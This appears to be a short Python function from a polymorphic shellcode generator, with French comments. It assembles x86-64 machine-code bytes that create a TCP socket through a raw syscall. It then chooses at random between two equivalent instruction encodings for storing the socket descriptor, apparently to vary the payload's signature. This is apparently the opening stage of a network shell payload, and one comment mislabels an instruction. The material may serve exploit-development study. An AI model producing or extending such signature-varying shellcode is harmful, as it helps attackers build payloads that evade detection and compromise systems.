#!/usr/bin/env python3
import random
from func_instu import *

def partie1():

    # PARTIE : SOCKET

    
    moval = '\\xb0\\x29' # mov al, 41 
    movdil = '\\x40\\xb7\\x02' # mov dil, 2
    movsil = '\\x40\\xb6\\x01' # mov sil, 1
    movdl = '\\xb2\\x06' # mov dl, 6
    syscall = '\\x0f\\x05' # syscalls


    part1 = [
        '\\x50\\x41\\x58', # push rax, pop r8
        '\\x49\\x89\\xc0' # push r8, rax
    ]

    x = random.randint(0, 1)

    if x == 0 :
        choix = part1[0]
    elif x == 1 :
        choix = part1[1]
    
    resultat = moval + movdil + movsil + movdl + syscall + choix

    print(resultat)
    print("")

    return resultat    